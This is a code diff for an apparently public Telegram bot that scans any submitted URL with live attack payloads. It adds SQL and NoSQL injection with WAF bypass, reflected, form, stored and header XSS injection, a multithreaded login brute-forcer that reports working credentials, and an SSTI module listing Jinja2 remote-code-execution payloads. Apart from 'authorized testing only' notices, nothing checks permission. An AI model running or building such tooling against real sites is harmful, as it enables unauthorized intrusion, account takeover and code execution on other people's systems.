-    results["total_found"] = (len(results["error_based"]) +
-                               len(results["boolean_based"]) +
-                               len(results["time_based"]))
+    # ── Phase 4: NoSQL injection ───────────────────
+    progress_q.append("🧪 Phase 4: NoSQL injection testing...")
+    for param in list(params.keys())[:3]:
+        found, payload = _test_nosql(param)
+        if found:
+            results["nosql_based"].append({"param": param, "payload": payload})
+            progress_q.append(f"🔴 NoSQL injection! Param: `{param}`")
+            break
+
+    results["total_found"] = (
+        len(results["error_based"]) + len(results["boolean_based"]) +
+        len(results["time_based"]) + len(results["post_based"]) +
+        len(results["header_based"]) + len(results["nosql_based"])
+    )
     return results
 
 
@@ -11200,11 +11440,15 @@ async def cmd_sqli(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
         await update.effective_message.reply_text(
             "📌 *Usage:* `/sqli https://example.com/page?id=1`\n\n"
-            "🧪 *Tests 3 SQLi types:*\n"
-            "  ① Error-based — DB error messages\n"
-            "  ② Boolean-based — Content length diff\n"
-            "  ③ Time-based — Response delay (SLEEP/WAITFOR)\n\n"
-            "🗄 *Detects:* MySQL, PostgreSQL, MSSQL, Oracle, SQLite\n"
+            "🧪 *Tests 6 SQLi types:*\n"
+            "  ① Error-based GET — DB error messages\n"
+            "  ② POST body injection — form + JSON\n"
+            "  ③ HTTP header injection — User-Agent, Referer, X-Forwarded-For\n"
+            "  ④ Boolean-based — Content length diff (difflib)\n"
+            "  ⑤ Time-based blind — SLEEP/WAITFOR/pg\\_sleep\n"
+            "  ⑥ NoSQL injection — MongoDB `$gt`/`$ne`/`$regex`\n\n"
+            "🛡️ *WAF bypass payloads auto-enabled if WAF detected*\n"
+            "🗄 *Detects:* MySQL, PostgreSQL, MSSQL, Oracle, SQLite, DB2, NoSQL\n"
             "⚠️ _Authorized testing only_",
             parse_mode='Markdown'
         )
@@ -11269,8 +11513,9 @@ async def cmd_sqli(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     total = data["total_found"]
     severity = "🔴 CRITICAL" if total > 0 else "✅ Not Detected"
+    waf_flag = " ⚠️ WAF" if data.get("waf_detected") else ""
     lines = [
-        f"💉 *SQL Injection — `{domain}`*",
+        f"💉 *SQL Injection — `{domain}`*{waf_flag}",
         f"━━━━━━━━━━━━━━━━━━━━",
         f"Result: {severity}",
         f"Total vulnerabilities: `{total}`",
@@ -11281,27 +11526,41 @@ async def cmd_sqli(update: Update, context: ContextTypes.DEFAULT_TYPE):
     lines.append("")
 
     if data["error_based"]:
-        lines.append(f"*🔴 Error-Based SQLi ({len(data['error_based'])}):*")
-        for e in data["error_based"][:5]:
-            lines.append(f"  Param: `{e['param']}`")
+        lines.append(f"*🔴 Error-Based SQLi (GET) — {len(data['error_based'])}:*")
+        for e in data["error_based"][:3]:
+            lines.append(f"  Param: `{e['param']}` | DB: `{e['db_type']}`")
             lines.append(f"  Payload: `{e['payload'][:40]}`")
-            lines.append(f"  DB: `{e['db_type']}`")
+
+    if data.get("post_based"):
+        lines.append(f"\n*🔴 POST Body SQLi — {len(data['post_based'])}:*")
+        for e in data["post_based"][:3]:
+            lines.append(f"  Param: `{e['param']}` | DB: `{e['db_type']}` | {e['method']}")
+
+    if data.get("header_based"):
+        lines.append(f"\n*🔴 HTTP Header Injection — {len(data['header_based'])}:*")
+        for e in data["header_based"][:3]:
+            lines.append(f"  Header: `{e['header']}` | DB: `{e['db_type']}`")
+            lines.append(f"  Payload: `{e['payload'][:40]}`")
 
     if data["boolean_based"]:
-        lines.append(f"\n*🟠 Boolean-Based SQLi ({len(data['boolean_based'])}):*")
+        lines.append(f"\n*🟠 Boolean-Based SQLi — {len(data['boolean_based'])}:*")
         for b in data["boolean_based"][:3]:
             lines.append(f"  Param: `{b['param']}` | Diff: `{b['content_diff']}` bytes")
 
     if data["time_based"]:
-        lines.append(f"\n*🔴 Time-Based Blind SQLi ({len(data['time_based'])}):*")
+        lines.append(f"\n*🔴 Time-Based Blind SQLi — {len(data['time_based'])}:*")
         for t in data["time_based"][:3]:
             lines.append(f"  Param: `{t['param']}` | Delay: `{t['elapsed_sec']}s`")
             lines.append(f"  Payload: `{t['payload'][:45]}`")
 
+    if data.get("nosql_based"):
+        lines.append(f"\n*🟣 NoSQL Injection — {len(data['nosql_based'])}:*")
+        for n in data["nosql_based"][:3]:
+            lines.append(f"  Param: `{n['param']}` | Payload: `{str(n['payload'])[:40]}`")
+
     if total == 0:
         lines.append("✅ No SQL injection vulnerabilities detected\n_Basic inputs tested — manual testing recommended_")
 
-    # ✅ Bug #3 Fix: URL မှာ params မပါရင် false positive warning ပြ
     if data.get("_no_params_in_url"):
         lines.append(
             "\n⚠️ _URL တွင် query params မပါသောကြောင့် common params ဖြင့် test လုပ်သည်_\n"
@@ -11487,22 +11746,32 @@ _XSS_REFLECTION_SINKS = [
     r'onfocus\s*=\s*["\']?alert\(', r'onclick\s*=\s*["\']?alert\(',
     r'onmouseover\s*=\s*["\']?alert\(',r'<iframe[^>]*onerror',
     r'<details[^>]*ontoggle', r'alert\`1\`',
+    r'<svg[^>]*onbegin', r'<input[^>]*onfocus',
+    r'<body[^>]*onload', r'<div[^>]*onmouseover',
 ]
 
 def _xss_scan_sync(url: str, progress_q: list) -> dict:
-    """XSS scanner — reflected + DOM-based."""
+    """XSS scanner — reflected + DOM + form POST + header reflection + CSP analysis."""
     results = {
-        "reflected": [],
-        "dom_sinks": [],
-        "forms_found": 0,
+        "reflected":    [],
+        "dom_sinks":    [],
+        "form_based":   [],
+        "stored":       [],
+        "header_xss":   [],
+        "forms_found":  0,
         "params_tested": [],
-        "total_found": 0,
-        "csp_present": False,
+        "total_found":  0,
+        "csp_present":  False,
+        "csp_bypassable": False,
     }
 
     parsed = urlparse(url)
     params_raw = parsed.query
     base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+
+    session = requests.Session()
+    session.headers.update(_get_headers())
+    session.verify = False
 
     params = {}
     if params_raw:
@@ -11511,13 +11780,22 @@ def _xss_scan_sync(url: str, progress_q: list) -> dict:
                 k, v = part.split("=", 1)
                 params[k] = v
 
-    # ── Fetch page and find forms too ─────────────
+    # ── Fetch page, find forms and DOM sinks ───────
+    soup = None
+    csp_value = ""
     try:
-        resp = requests.get(url, headers=_get_headers(), timeout=12, verify=False)
-        soup = BeautifulSoup(resp.text, 'html.parser')
-        results["csp_present"] = "content-security-policy" in str(resp.headers).lower()
+        resp = session.get(url, timeout=12)
+        soup = BeautifulSoup(resp.text, _BS_PARSER)
+        csp_value = resp.headers.get("Content-Security-Policy", "")
+        results["csp_present"] = bool(csp_value)
 
-        # Extract form params
+        # CSP bypass analysis
+        if csp_value:
+            bypass_hints = ["unsafe-inline", "unsafe-eval", "data:", "*", "blob:"]
+            if any(h in csp_value.lower() for h in bypass_hints):
+                results["csp_bypassable"] = True
+
+        # Extract ALL form fields
         for form in soup.find_all("form"):
             results["forms_found"] += 1
             for inp in form.find_all(["input", "textarea", "select"]):
@@ -11525,123 +11803,166 @@ def _xss_scan_sync(url: str, progress_q: list) -> dict:
                 if name and name not in params:
                     params[name] = "test"
 
-        # DOM sink analysis — only flag if USER-CONTROLLED source + dangerous sink
-        scripts = [s.string for s in soup.find_all("script") if s.string]
-        # Sources: things user can control
+        # DOM sink analysis — only if user-controlled source present
         user_sources = [
             r'location\.search', r'location\.hash', r'location\.href',
-            r'document\.URL', r'document\.referrer',
-            r'window\.name', r'document\.cookie',
-            r'URLSearchParams', r'location\.pathname',
+            r'document\.URL', r'document\.referrer', r'window\.name',
+            r'document\.cookie', r'URLSearchParams', r'location\.pathname',
+            r'getParameterByName', r'getUrlParam',
         ]
-        # Dangerous sinks (execution context)
         dangerous_sinks = [
             (r'document\.write\s*\(',    "document.write() + user input"),
             (r'innerHTML\s*=',           "innerHTML + user input"),
             (r'outerHTML\s*=',           "outerHTML + user input"),
             (r'eval\s*\(',               "eval() + user input"),
             (r'setTimeout\s*\(\s*[^,]+location', "setTimeout with location"),
-            (r'setInterval\s*\(\s*[^,]+location', "setInterval with location"),
+            (r'\$\s*\(\s*["\'].*location', "jQuery selector + location"),
+            (r'\.html\s*\(\s*.*location', "jQuery .html() + location"),
+            (r'insertAdjacentHTML',       "insertAdjacentHTML + user input"),
         ]
-        for script_text in scripts:
-            if not script_text: continue
-            # Check if this script has any user-controlled source
+        for script_text in [s.string for s in soup.find_all("script") if s.string]:
             has_user_source = any(re.search(src, script_text, re.I) for src in user_sources)
             if not has_user_source:
-                continue   # No user input source → skip
-            # Now check for dangerous sinks in SAME script
+                continue
             for pat, desc in dangerous_sinks:
-                if re.search(pat, script_text, re.I):
-                    if desc not in results["dom_sinks"]:
-                        results["dom_sinks"].append(desc)
+                if re.search(pat, script_text, re.I) and desc not in results["dom_sinks"]:
+                    results["dom_sinks"].append(desc)
     except Exception as _e:
-        logging.debug("Scan error: %s", _e)
+        logging.debug("XSS fetch error: %s", _e)
 
     if not params:
         common_params = ["q", "search", "name", "id", "page", "url", "redirect",
-                         "message", "comment", "title", "text", "s"]
+                         "message", "comment", "title", "text", "s", "input", "data"]
         params = {p: "test" for p in common_params[:6]}
 
     results["params_tested"] = list(params.keys())
     progress_q.append(f"🔍 Testing `{len(params)}` params for XSS...")
 
-    # ── Reflected XSS testing ──────────────────────
+    # ── Reflected XSS — parallel param testing ─────
     marker = f"XSSTEST{random.randint(10000,99999)}"
 
-    for param in list(params.keys())[:6]:
-        progress_q.append(f"🧪 Testing param: `{param}`...")
-        for payload in _XSS_PAYLOADS[:12]:
-            try:
-                test_params = dict(params)
-                test_params[param] = payload
-                r = requests.get(base_url, params=test_params, headers=_get_headers(),
-                                 timeout=8, verify=False)
-                body = r.text
+    def _test_reflected(param, payload):
+        try:
+            test_params = dict(params)
+            test_params[param] = payload
+            r = session.get(base_url, params=test_params, timeout=8)
+            body = r.text
+            if payload.lower() in body.lower():
+                escaped_versions = [
+                    payload.replace("<", "&lt;").replace(">", "&gt;"),
+                    payload.replace('"', "&quot;").replace("'", "&#39;"),
+                    payload.replace("<", "\\u003c").replace(">", "\\u003e"),
+                ]
+                is_escaped = any(ev.lower() in body.lower() for ev in escaped_versions)
+                if not is_escaped:
+                    sev = "HIGH" if any(x in payload.lower() for x in
+                                       ("<script", "onerror", "onload", "onfocus")) else "MEDIUM"
+                    return {"param": param, "payload": payload,
+                            "status": r.status_code, "severity": sev, "method": "GET"}
+        except Exception:
+            pass
+        return None
 
-                # Check if payload reflected unescaped
-                if payload.lower() in body.lower():
-                    # Verify it's not escaped
-                    escaped_versions = [
-                        payload.replace("<", "&lt;").replace(">", "&gt;"),
-                        payload.replace('"', "&quot;").replace("'", "&#39;"),
-                    ]
-                    is_escaped = any(ev.lower() in body.lower() for ev in escaped_versions)
-                    if not is_escaped:
-                        results["reflected"].append({
-                            "param": param,
-                            "payload": payload,
-                            "status": r.status_code,
-                            "severity": "HIGH" if "<script" in payload.lower() or "onerror" in payload.lower() else "MEDIUM"
-                        })
-                        progress_q.append(f"🔴 XSS reflected! Param: `{param}`")
-                        break
-            except Exception:
-                pass
+    # Test in parallel
+    with concurrent.futures.ThreadPoolExecutor(max_workers=6) as ex:
+        pairs = [(p, pl) for p in list(params.keys())[:6] for pl in _XSS_PAYLOADS[:15]]
+        found_params = set()
+        for result_item in ex.map(lambda a: _test_reflected(*a), pairs):
+            if result_item and result_item["param"] not in found_params:
+                results["reflected"].append(result_item)
+                found_params.add(result_item["param"])
+                progress_q.append(f"🔴 XSS reflected! Param: `{result_item['param']}` | Sev: {result_item['severity']}")
 
-    # ── Stored XSS check (POST params) ────────────
-    progress_q.append("🔍 Testing Stored XSS via POST forms...")
-    stored_marker = f"STOREDXSS{random.randint(10000,99999)}"
-    try:
-        resp2 = requests.get(url, headers=_get_headers(), timeout=10, verify=False)
-        soup2 = BeautifulSoup(resp2.text, _BS_PARSER)
-        for form in soup2.find_all('form')[:3]:
+    # ── Form-based XSS (POST) ──────────────────────
+    progress_q.append("🔍 Testing form-based XSS (POST)...")
+    if soup:
+        for form in soup.find_all('form')[:4]:
             action = form.get('action', '')
             form_url = urljoin(url, action) if action else url
             method   = form.get('method', 'get').lower()
-            if method != 'post':
+            form_params = {}
+            for inp in form.find_all(['input', 'textarea', 'select']):
+                iname = inp.get('name')
+                itype = inp.get('type', 'text').lower()
+                if iname:
+                    if itype in ('submit', 'button'):
+                        continue
+                    elif itype == 'hidden':
+                        form_params[iname] = inp.get('value', '')
+                    else:
+                        form_params[iname] = '<img src=x onerror=alert(1)>'
+
+            if not form_params:
+                continue
+            safe_ok2, _ = is_safe_url(form_url)
+            if not safe_ok2:
+                continue
+            try:
+                fn = session.post if method == 'post' else session.get
+                r_form = fn(form_url, data=form_params, timeout=10, allow_redirects=True)
+                body = r_form.text
+                # Check reflection
+                if 'onerror=alert(1)' in body and '<img src=x onerror=alert(1)>' in body:
+                    results["form_based"].append({
+                        "form_url": form_url, "method": method.upper(),
+                        "params": list(form_params.keys()), "severity": "HIGH"
+                    })
+                    progress_q.append(f"🔴 Form XSS! URL: `{form_url}` [{method.upper()}]")
+            except Exception:
+                pass
+
+    # ── Stored XSS check ──────────────────────────
+    progress_q.append("🔍 Testing Stored XSS...")
+    stored_marker = f"STOREDXSS{random.randint(10000,99999)}"
+    if soup:
+        for form in soup.find_all('form')[:3]:
+            action = form.get('action', '')
+            form_url = urljoin(url, action) if action else url
+            if form.get('method', 'get').lower() != 'post':
                 continue
             post_data = {}
             for inp in form.find_all(['input', 'textarea']):
                 iname = inp.get('name')
                 itype = inp.get('type', 'text').lower()
-                if iname and itype not in ('submit', 'button', 'hidden', 'file'):
-                    post_data[iname] = f'<script>alert("{stored_marker}")</script>'
-                elif iname and itype == 'hidden':
-                    post_data[iname] = inp.get('value', '')
+                if iname and itype not in ('submit', 'button', 'file'):
+                    if itype == 'hidden':
+                        post_data[iname] = inp.get('value', '')
+                    else:
+                        post_data[iname] = f'<script>alert("{stored_marker}")</script>'
             if not post_data:
                 continue
             safe_ok2, _ = is_safe_url(form_url)
             if not safe_ok2:
                 continue
             try:
-                r_post = requests.post(form_url, data=post_data,
-                    headers=_get_headers(), timeout=10, verify=False, allow_redirects=True)
-                # Check if marker reflected back in response
+                r_post = session.post(form_url, data=post_data, timeout=10, allow_redirects=True)
                 if stored_marker in r_post.text:
-                    results.setdefault("stored", []).append({
-                        "form_url": form_url,
-                        "params": list(post_data.keys()),
-                        "severity": "HIGH",
+                    results["stored"].append({
+                        "form_url": form_url, "params": list(post_data.keys()), "severity": "HIGH"
                     })
                     progress_q.append(f"🔴 Stored XSS candidate! Form: `{form_url}`")
             except Exception:
                 pass
-    except Exception as _e:
-        logging.debug("Scan error: %s", _e)
 
-    results["total_found"] = (len(results["reflected"]) +
-                               len(results["dom_sinks"]) +
-                               len(results.get("stored", [])))
+    # ── Header-based XSS (Referer / X-Forwarded-For) ──
+    progress_q.append("🔍 Testing header-based XSS reflection...")
+    for header_name in ["Referer", "X-Forwarded-For", "User-Agent"]:
+        payload = '<img src=x onerror=alert(1)>'
+        try:
+            inj_headers = dict(_get_headers())
+            inj_headers[header_name] = payload
+            r_hdr = session.get(base_url, headers=inj_headers, timeout=8)
+            if payload.lower() in r_hdr.text.lower():
+                results["header_xss"].append({"header": header_name, "payload": payload})
+                progress_q.append(f"🔴 Header XSS! `{header_name}` reflected")
+        except Exception:
+            pass
+
+    results["total_found"] = (
+        len(results["reflected"]) + len(results["dom_sinks"]) +
+        len(results["form_based"]) + len(results.get("stored", [])) +
+        len(results["header_xss"])
+    )
     return results
 
 
@@ -11720,25 +12041,44 @@ async def cmd_xss(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     total = data["total_found"]
     severity = "🔴 VULNERABLE" if total > 0 else "✅ Not Detected"
+    csp_status = "✅ Present" if data['csp_present'] else "❌ Missing"
+    if data['csp_present'] and data.get('csp_bypassable'):
+        csp_status = "⚠️ Present but bypassable (unsafe-inline/eval)"
     lines = [
         f"🎯 *XSS Scan — `{domain}`*",
         f"━━━━━━━━━━━━━━━━━━━━",
         f"Result: {severity}",
         f"Forms found: `{data['forms_found']}`",
         f"Params tested: `{'`, `'.join(data['params_tested'][:8])}`",
-        f"CSP: {'✅ Present' if data['csp_present'] else '❌ Missing (XSS easier)'}",
+        f"CSP: {csp_status}",
         "",
     ]
 
     if data["reflected"]:
-        lines.append(f"*🔴 Reflected XSS ({len(data['reflected'])}):*")
-        for r in data["reflected"][:8]:
+        lines.append(f"*🔴 Reflected XSS (GET) — {len(data['reflected'])}:*")
+        for r in data["reflected"][:5]:
             sev_icon = "🔴" if r["severity"] == "HIGH" else "🟠"
-            lines.append(f"  {sev_icon} Param: `{r['param']}`")
+            lines.append(f"  {sev_icon} Param: `{r['param']}` | {r['severity']}")
             lines.append(f"     Payload: `{r['payload'][:50]}`")
 
+    if data.get("form_based"):
+        lines.append(f"\n*🔴 Form-Based XSS (POST) — {len(data['form_based'])}:*")
+        for f in data["form_based"][:3]:
+            lines.append(f"  🔴 URL: `{f['form_url'][:60]}` [{f['method']}]")
+            lines.append(f"     Fields: `{'`, `'.join(f['params'][:4])}`")
+
+    if data.get("stored"):
+        lines.append(f"\n*🔴 Stored XSS Candidates — {len(data['stored'])}:*")
+        for s in data["stored"][:3]:
+            lines.append(f"  🔴 Form: `{s['form_url'][:60]}`")
+
+    if data.get("header_xss"):
+        lines.append(f"\n*🟠 Header-Based XSS — {len(data['header_xss'])}:*")
+        for h in data["header_xss"][:3]:
+            lines.append(f"  🟠 Header: `{h['header']}` reflected unescaped")
+
     if data["dom_sinks"]:
-        lines.append(f"\n*🟠 DOM XSS Sinks ({len(data['dom_sinks'])}):*")
+        lines.append(f"\n*🟠 DOM XSS Sinks — {len(data['dom_sinks'])}:*")
         for sink in data["dom_sinks"]:
             lines.append(f"  ⚠️ `{sink}`")
 
@@ -13010,21 +13350,22 @@ _COMMON_USERNAMES = [
 
 def _bruteforce_sync(login_url: str, username_field: str, password_field: str,
                      usernames: list, passwords: list, progress_q: list) -> dict:
-    """Smart login brute force with rate-limit detection."""
+    """Smart login brute force — parallel + JSON API auto-detect + cookie change detection."""
     results = {
-        "login_url": login_url,
-        "tested": 0,
-        "found": [],
-        "rate_limited": False,
+        "login_url":        login_url,
+        "tested":           0,
+        "found":            [],
+        "rate_limited":     False,
         "lockout_detected": False,
         "captcha_detected": False,
-        "errors": [],
+        "json_api":         False,
+        "errors":           [],
     }
     session = requests.Session()
     session.headers.update(_get_headers())
     session.verify = False
 
-    # Get baseline (failed login response)
+    # ── Baseline: failed login response ────────────
     try:
         baseline_resp = session.post(login_url, data={
             username_field: "zz_invalid_user_zz",
@@ -13033,79 +13374,141 @@ def _bruteforce_sync(login_url: str, username_field: str, password_field: str,
         baseline_len  = len(baseline_resp.text)
         baseline_url  = baseline_resp.url
         baseline_code = baseline_resp.status_code
+        baseline_cookies = set(baseline_resp.cookies.keys())
         progress_q.append(f"🔐 Baseline: HTTP {baseline_code}, body {baseline_len}B")
     except Exception as e:
         results["errors"].append(f"Baseline failed: {e}")
         return results
 
-    # Detect CAPTCHA in baseline
-    captcha_hints = ["captcha","recaptcha","hcaptcha","turnstile","i am not a robot"]
+    # ── Auto-detect JSON API ───────────────────────
+    try:
+        json_test = session.post(
+            login_url,
+            json={username_field: "test", password_field: "test"},
+            headers={**_get_headers(), "Content-Type": "application/json"},
+            timeout=8
+        )
+        if json_test.status_code not in (415, 400) and \
+           "application/json" in json_test.headers.get("Content-Type",""):
+            results["json_api"] = True
+            progress_q.append("🔌 JSON API detected — using JSON body")
+    except Exception:
+        pass
+
+    # ── CAPTCHA detection ──────────────────────────
+    captcha_hints = ["captcha","recaptcha","hcaptcha","turnstile","i am not a robot","cf-turnstile"]
     if any(h in baseline_resp.text.lower() for h in captcha_hints):
         results["captcha_detected"] = True
         progress_q.append("⚠️ CAPTCHA detected — brute limited")
 
+    total_attempts = min(len(usernames) * len(passwords), 300)
     consecutive_429 = 0
-    total_attempts = min(len(usernames) * len(passwords), 200)  # cap at 200
+    lock = threading.Lock()
 
-    for uname in usernames:
-        if results["rate_limited"] or results["lockout_detected"]:
-            break
-        for pwd in passwords:
-            results["tested"] += 1
-            if results["tested"] > 200:
-                break
-            try:
-                # Try both form-data and JSON body (modern APIs)
-                login_payload = {username_field: uname, password_field: pwd}
+    def _try_login(uname: str, pwd: str) -> Optional[dict]:
+        nonlocal consecutive_429
+        login_payload = {username_field: uname, password_field: pwd}
+        try:
+            if results["json_api"]:
+                resp = session.post(
+                    login_url, json=login_payload,
+                    headers={**_get_headers(), "Content-Type": "application/json"},
+                    timeout=10, allow_redirects=True
+                )
+            else:
                 resp = session.post(login_url, data=login_payload,
-                    timeout=10, allow_redirects=True)
-                # If form failed with 415/400, try JSON
+                                    timeout=10, allow_redirects=True)
+                # Fallback to JSON if form rejected
                 if resp.status_code in (400, 415, 422):
-                    resp = session.post(login_url, json=login_payload,
+                    resp = session.post(
+                        login_url, json=login_payload,
                         headers={**_get_headers(), "Content-Type": "application/json"},
-                        timeout=10, allow_redirects=True)
+                        timeout=10, allow_redirects=True
+                    )
 
-                # Rate limit detection
-                if resp.status_code == 429:
+            # Rate limit
+            if resp.status_code == 429:
+                with lock:
                     consecutive_429 += 1
-                    if consecutive_429 >= 3:
-                        results["rate_limited"] = True
-                        progress_q.append("🚫 Rate limit hit — stopping")
-                        break
-                    time.sleep(5)
-                    continue
-                else:
-                    consecutive_429 = 0
+                time.sleep(5)
+                return None
 
-                # Lockout detection
-                lockout_hints = ["account locked","too many attempts","locked out","suspended","banned"]
-                if any(h in resp.text.lower() for h in lockout_hints):
-                    results["lockout_detected"] = True
-                    progress_q.append(f"🔒 Lockout detected at attempt {results['tested']}")
-                    break
+            with lock:
+                consecutive_429 = 0
 
-                # Success detection — compare with baseline
-                body_len_diff = abs(len(resp.text) - baseline_len)
-                url_changed   = resp.url != baseline_url
-                code_changed  = resp.status_code != baseline_code
-                success_hints = ["dashboard","logout","welcome","profile","my account","sign out"]
-                hint_found    = any(h in resp.text.lower() for h in success_hints)
+            # Lockout detection
+            lockout_hints = ["account locked","too many attempts","locked out",
+                             "suspended","banned","temporarily blocked"]
+            if any(h in resp.text.lower() for h in lockout_hints):
+                results["lockout_detected"] = True
+                return None
 
-                is_success = (url_changed and resp.status_code in (200, 302)) or \
-                             hint_found or \
-                             (body_len_diff > 500 and code_changed)
+            # Success detection — multi-signal
+            body_len_diff = abs(len(resp.text) - baseline_len)
+            url_changed   = resp.url != baseline_url
+            code_changed  = resp.status_code != baseline_code
+            new_cookies   = set(resp.cookies.keys()) - baseline_cookies
 
-                if is_success:
-                    results["found"].append({"username": uname, "password": pwd,
-                                             "status": resp.status_code, "url": resp.url})
-                    progress_q.append(f"🔓 FOUND: {uname}:{pwd}")
+            success_hints = ["dashboard","logout","welcome","profile","my account",
+                             "sign out","settings","account","home","admin",
+                             "\"success\":true", '"authenticated":true',
+                             '"token":', '"access_token":']
+            hint_found = any(h in resp.text.lower() for h in success_hints)
 
-                # Polite delay to avoid hammering
-                time.sleep(0.8)
-                progress_q.append(f"🔐 [{results['tested']}/{total_attempts}] {uname}:{pwd[:4]}***")
+            # JSON API success detection
+            json_success = False
+            try:
+                rj = resp.json()
+                json_success = bool(
+                    rj.get("token") or rj.get("access_token") or
+                    rj.get("success") or rj.get("user") or
+                    (rj.get("status") == "success")
+                )
+            except Exception:
+                pass
 
-            except Exception as e:
-                results["errors"].append(str(e)[:60])
+            is_success = (
+                json_success or
+                (url_changed and resp.status_code in (200, 302)) or
+                hint_found or
+                bool(new_cookies) or
+                (body_len_diff > 300 and code_changed)
+            )
+
+            if is_success:
+                return {
+                    "username": uname, "password": pwd,
+                    "status": resp.status_code, "url": resp.url,
+                    "new_cookies": list(new_cookies)
+                }
+        except Exception as e:
+            results["errors"].append(str(e)[:60])
+        return None
+
+    # ── Parallel credential testing (3 threads) ────
+    import threading
+    pairs = [(u, p) for u in usernames for p in passwords][:total_attempts]
+    tested = 0
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as ex:
+        for result_item in ex.map(lambda a: _try_login(*a), pairs):
+            tested += 1
+            results["tested"] = tested
+            if tested % 20 == 0:
+                progress_q.append(
+                    f"🔐 [{tested}/{total_attempts}] Testing... | Found: {len(results['found'])} | "
+                    f"{'⚠️ CAPTCHA' if results['captcha_detected'] else ''}")
+            if result_item:
+                results["found"].append(result_item)
+                progress_q.append(
+                    f"🔓 FOUND: `{result_item['username']}`:`{result_item['password']}`")
+            if results["rate_limited"] or results["lockout_detected"]:
+                break
+            if consecutive_429 >= 5:
+                results["rate_limited"] = True
+                progress_q.append("🚫 Rate limit hit — stopping")
+                break
+            time.sleep(0.4)   # Polite delay
 
     return results
 
@@ -14228,6 +14631,615 @@ async def cmd_gitexposed(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode='Markdown'
         )
         _active_scans.pop(uid, None)
+
+
+
+# ╔══════════════════════════════════════════════════════════════╗
+# ║   NEW SCANNERS v28.1 — SSTI / CORS / Open Redirect / LFI   ║
+# ╚══════════════════════════════════════════════════════════════╝
+
+# ══════════════════════════════════════════════════
+# 🔥 /ssti — Server-Side Template Injection Scanner
+# ══════════════════════════════════════════════════
+
+_SSTI_PAYLOADS = [
+    # ── Detection probes (math that shouldn't execute normally) ──
+    ("{{7*7}}",          "49",     "Jinja2/Twig"),
+    ("${7*7}",           "49",     "FreeMarker/Velocity"),
+    ("#{7*7}",           "49",     "Ruby ERB/Thymeleaf"),
+    ("<%= 7*7 %>",       "49",     "Ruby ERB"),
+    ("{{7*'7'}}",        "7777777","Jinja2"),
+    ("${{7*7}}",         "49",     "Spring/Thymeleaf"),
+    ("{7*7}",            "49",     "Smarty"),
+    ("@(7*7)",           "49",     "Razor"),
+    ("{{config}}",       "secret_key", "Flask/Jinja2 config leak"),
+    ("{{settings.SECRET_KEY}}", "SECRET_KEY", "Django settings"),
+    ("{{self.__dict__}}", "_TemplateReference", "Jinja2 object"),
+    ("*{7*7}",           "49",     "Thymeleaf"),
+    ("a{*comment*}b",    "ab",     "Smarty comment"),
+    ("%{7*7}",           "49",     "Freemarker"),
+]
+
+_SSTI_EXPLOITATION = [
+    # RCE via Jinja2
+    ("{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}", "Jinja2 RCE"),
+    ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "Jinja2 os.popen"),
+    ("{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}", "Jinja2 builtins"),
+]
+
+def _ssti_scan_sync(url: str, progress_q: list) -> dict:
+    """SSTI scanner — detects template injection in URL params and POST forms."""
+    results = {
+        "vulnerable": [],
+        "params_tested": [],
+        "engine_detected": None,
+        "total_found": 0,
+    }
+    parsed = urlparse(url)
+    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+    params = {}
+    if parsed.query:
+        for p in parsed.query.split("&"):
+            if "=" in p:
+                k, v = p.split("=", 1)
+                params[k] = v
+    if not params:
+        params = {p: "1" for p in ["q", "name", "id", "search", "input", "msg"]}
+
+    session = requests.Session()
+    session.headers.update(_get_headers())
+    session.verify = False
+
+    progress_q.append(f"🔥 Testing {len(_SSTI_PAYLOADS)} SSTI payloads on {len(params)} params...")
+    results["params_tested"] = list(params.keys())
+
+    for param in list(params.keys())[:6]:
+        for payload, expected, engine in _SSTI_PAYLOADS:
+            try:
+                test_params = dict(params)
+                test_params[param] = payload
+                r = session.get(base_url, params=test_params, timeout=8)
+                if expected.lower() in r.text.lower():
+                    results["vulnerable"].append({
+                        "param": param, "payload": payload,
+                        "expected": expected, "engine": engine,
+                        "severity": "CRITICAL"
+                    })
+                    results["engine_detected"] = engine
+                    progress_q.append(f"🔥 SSTI found! Param: `{param}` | Engine: `{engine}`")
+                    break
+            except Exception:
+                pass
+
+    results["total_found"] = len(results["vulnerable"])
+    return results
+
+async def cmd_ssti(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/ssti <url> — Server-Side Template Injection scanner"""
+    if not await check_force_join(update, context): return
+    uid = update.effective_user.id
+    allowed, wait = check_rate_limit(uid)
+    if not allowed:
+        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
+        return
+
+    if not context.args:
+        await update.effective_message.reply_text(
+            "🔥 *SSTI Scanner Usage:*\n`/ssti https://example.com/page?name=test`\n\n"
+            "*Detects:*\n"
+            "  • Jinja2 / Flask\n  • Twig / PHP\n  • FreeMarker / Velocity\n"
+            "  • Ruby ERB\n  • Thymeleaf / Spring\n  • Smarty\n\n"
+            "⚠️ _Authorized testing only_",
+            parse_mode='Markdown'
+        )
+        return
+
+    url = context.args[0].strip()
+    if not url.startswith('http'): url = 'https://' + url
+    safe_ok, reason = is_safe_url(url)
+    if not safe_ok:
+        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
+        return
+
+    if uid in _active_scans:
+        await update.effective_message.reply_text(
+            f"⏳ *`{_active_scans[uid]}` running* — `/stop` နှိပ်ပါ", parse_mode='Markdown')
+        return
+    _active_scans[uid] = "SSTI scan"
+
+    domain = urlparse(url).hostname
+    msg = await update.effective_message.reply_text(
+        f"🔥 *SSTI Scan — `{domain}`*\n\n⏳ Testing template injection...", parse_mode='Markdown')
+    progress_q = []
+
+    async def _prog():
+        while True:
+            await asyncio.sleep(2)
+            if progress_q:
+                txt = progress_q[-1]; progress_q.clear()
+                try: await msg.edit_text(f"🔥 *SSTI — `{domain}`*\n\n{txt}", parse_mode='Markdown')
+                except Exception: pass
+
+    prog = asyncio.create_task(_prog())
+    try:
